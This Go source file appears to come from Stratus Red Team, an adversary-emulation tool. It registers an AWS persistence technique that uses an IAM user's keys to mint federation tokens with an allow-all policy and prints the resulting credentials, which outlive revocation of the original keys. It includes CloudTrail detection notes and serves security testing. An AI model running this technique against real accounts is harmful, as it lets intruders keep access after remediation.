package aws

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"math"
	"time"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.sts-federation-token",
		FriendlyName: "Generate temporary AWS credentials using GetFederationToken",
		Description: `
Establishes persistence by generating new AWS temporary credentials through <code>sts:GetFederationToken</code>. The resulting credentials remain functional even if the original access keys are disabled.

Warm-up: 

- Create an IAM user and generate a pair of access keys.

Detonation: 

- Use the access keys from the IAM user to request temporary security credentials via <code>sts:GetFederationToken</code>.
- Call <code>sts:GetCallerIdentity</code> using these new credentials.

References:

- https://docs.aws.amazon.com/STS/latest/APIReference/API_GetFederationToken.html
- https://www.crowdstrike.com/en-us/blog/how-adversaries-persist-with-aws-user-federation/
- https://reinforce.awsevents.com/content/dam/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf
- https://fwdcloudsec.org/assets/presentations/2024/europe/sebastian-walla-cloud-conscious-tactics-techniques-and-procedures-an-overview.pdf
`,
		Detection: `
Through CloudTrail's <code>GetFederationToken</code> event.
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

const SessionPolicyAllowAll = `{
		"Version": "2012-10-17",
		"Statement": [
			{
				"Effect": "Allow",
				"Action": "*",
				"Resource": "*"
			}
		]
	}`

const MinDelayBeforeCallingGetFederationToken = 10 * time.Second

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	username := params["user_name"]
	accessKeyID := params["access_key_id"]
	secretAccessKey := params["secret_access_key"]

	ensureEventualConsistency(params)

	awsConfig := utils.AwsConfigFromCredentials(accessKeyID, secretAccessKey, "", &providers.AWS().UniqueCorrelationId)
	stsClient := sts.NewFromConfig(awsConfig)
	log.Println("Calling sts:GetFederationToken to generate temporary credentials")
	federationTokenResult, err := stsClient.GetFederationToken(context.Background(), &sts.GetFederationTokenInput{
		Name:   aws.String("stratus-red-team"), // Note: This can be anything and is unrelated to the underlying IAM username
		Policy: aws.String(SessionPolicyAllowAll),
	})
	if err != nil {
		return fmt.Errorf("error getting federation token: %v", err)
	}

	log.Println("Successfully obtained federated credentials for user " + username)
	tempCredentials := *federationTokenResult.Credentials
	tempCredentialsConfig := utils.AwsConfigFromCredentials(
		*tempCredentials.AccessKeyId,
		*tempCredentials.SecretAccessKey,
		*tempCredentials.SessionToken,
		&providers.AWS().UniqueCorrelationId,
	)
	federatedStsClient := sts.NewFromConfig(tempCredentialsConfig)

	log.Println("Calling sts:GetCallerIdentity with the newly-acquired federated credentials")
	federatedCallerIdentity, err := federatedStsClient.GetCallerIdentity(context.Background(), &sts.GetCallerIdentityInput{})
	if err != nil {
		return fmt.Errorf("error getting caller identity with federated credentials: %v", err)
	}
	log.Println("Result:", *federatedCallerIdentity.Arn)
	log.Println(`Here are the credentials below. Notice how they remain valid even if you disable the original access keys!

export AWS_ACCESS_KEY_ID="` + *tempCredentials.AccessKeyId + `"
export AWS_SECRET_ACCESS_KEY="` + *tempCredentials.SecretAccessKey + `"
export AWS_SESSION_TOKEN="` + *tempCredentials.SessionToken + `"
`)
	return nil
}

func ensureEventualConsistency(params map[string]string) {
	// Due to eventual consistency, we need to make sure at least a few seconds passed between when the access key is
	// created and when we call GetFederationToken
	createDate, _ := time.Parse(time.RFC3339, params["access_key_create_date"])
	createdSecondsAgo := time.Since(createDate)
	if createdSecondsAgo < MinDelayBeforeCallingGetFederationToken {
		sleepTime := MinDelayBeforeCallingGetFederationToken - createdSecondsAgo
		// print sleep time with 2 digits of precision
		log.Printf("Waiting for %f seconds before calling GetFederationToken due to eventual consistency", math.Round(sleepTime.Seconds()*100)/100)
		time.Sleep(sleepTime)
	}
}
